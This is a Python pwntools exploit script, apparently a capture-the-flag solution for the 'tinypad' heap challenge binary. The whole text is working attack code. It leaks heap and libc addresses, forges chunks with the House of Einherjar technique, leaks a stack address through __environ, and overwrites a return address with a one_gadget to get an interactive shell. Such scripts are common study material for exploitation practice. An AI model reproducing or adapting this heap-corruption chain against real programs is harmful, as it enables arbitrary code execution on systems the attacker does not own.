#coding:utf-8
from pwn import *
from LibcSearcher import *
sh = process("./tinypad")
# ip = ""
# port = 
# sh = remote(ip,port)
elf = ELF("./tinypad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
tinypad = 0x602040
libc_offset = 0x3C4B78
def add(size,content):
    sh.sendline("\n")
    sh.sendlineafter("(CMD)>>> ",'A')
    sh.sendlineafter("(SIZE)>>> ",str(size))
    sh.sendlineafter("(CONTENT)>>> ",content)

def delete(index):
    sh.sendlineafter("(CMD)>>> ",'D')
    sh.sendlineafter("(INDEX)>>> ",str(index))

def edit(index,content):
    sh.sendlineafter("(CMD)>>> ",'E')
    sh.sendlineafter("(INDEX)>>> ",str(index))
    sh.sendlineafter("(CONTENT)>>> ",content)
    sh.sendlineafter("(Y/n)>>> ","Y")

def leak_info():
    global heap_base, libc_base
    add(0xe0, 'a'*0x10)
    add(0xf0, 'b'*0xf0)
    add(0x100, 'c'*0x10)
    add(0x100, 'd'*0x10)
    delete(3)
    delete(1)

    sh.recvuntil("INDEX: 1\n # CONTENT: ")
    heap_base = u64(sh.recvn(4).ljust(8,"\x00")) -0x1f0
    log.info("heap_base:0x%x" %heap_base)
    sh.recvuntil("#   INDEX: 3\n # CONTENT: ")
    libc_base = u64(sh.recvn(6).ljust(8,"\x00")) - libc_offset
    log.info("libc_base:0x%x" %libc_base)


def house_of_einherjar():
    delete(4)   #move top chunk
    fake_chunk1 = "a" * 0xe0
    fake_chunk1 += p64(heap_base + 0xf0 - tinypad)
    add(0xe8, fake_chunk1)
    fake_chunk2 = p64(0x100) + p64(heap_base + 0xf0 - tinypad)
    fake_chunk2 += p64(0x602040)*4
    edit(2,fake_chunk2)
    sh.sendline("\n")
    delete(2)

def leak_stack():
    global stack_addr
    environ = libc_base + libc.symbols["__environ"]
    payload =p64(0xe8) + p64(environ)
    payload += p64(0xe8) + p64(tinypad+0x108)
    add(0xe0,"a"*0xe0)
    add(0xe0,payload)
    sh.recvuntil("INDEX: 1\n # CONTENT: ")
    stack_addr = u64(sh.recv(6).ljust(8,"\x00"))
    log.info("stack address:0x%x" %stack_addr)
    gdb.attach(sh)
    pause()

def pwn():
    one_gadget = libc_base + 0x45226
    edit(2,p64(stack_addr-0xf0))
    edit(1,p64(one_gadget))
    sh.sendlineafter("(CMD)>>> ",'Q')

    sh.interactive()

def main():
    leak_info()
    house_of_einherjar()
    leak_stack()
    pwn()


if __name__ == '__main__':
    main()
